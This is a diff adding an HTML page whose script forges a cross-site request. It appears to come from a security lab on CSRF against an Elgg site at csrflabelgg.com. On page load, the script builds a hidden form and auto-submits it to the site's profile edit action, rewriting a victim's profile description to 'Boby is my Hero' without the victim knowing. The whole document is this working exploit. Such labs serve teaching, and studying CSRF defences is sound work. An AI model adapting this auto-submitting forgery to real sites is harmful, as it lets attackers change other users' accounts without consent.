@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script type="text/javascript">
+function forge_post() {
+	var fields;
+
+	// Appends all necessary fields to be submitted.
+	fields += "<input type='hidden' name='name' value='Alice'>";
+	fields += "<input type='hidden' name='briefdescription' value='Boby is my Hero'>";
+	fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
+	fields += "<input type='hidden' name='guid' value='42'>";
+
+	// Creates a form element.
+	var p = document.createElement("form");
+
+	// Constructs the form.
+	p.action = "http://www.csrflabelgg.com/action/profile/edit";
+	p.innerHTML = fields;
+	p.method = "POST";
+
+	// Appends the form to the current page.
+	document.body.appendChild(p);
+
+	// Submits the form.
+	p.submit();
+}
+
+// Invoke forge_post after the page is loaded.
+window.onload = function() {
+	forge_post();
+}
+</script>
+</body>
+</html>
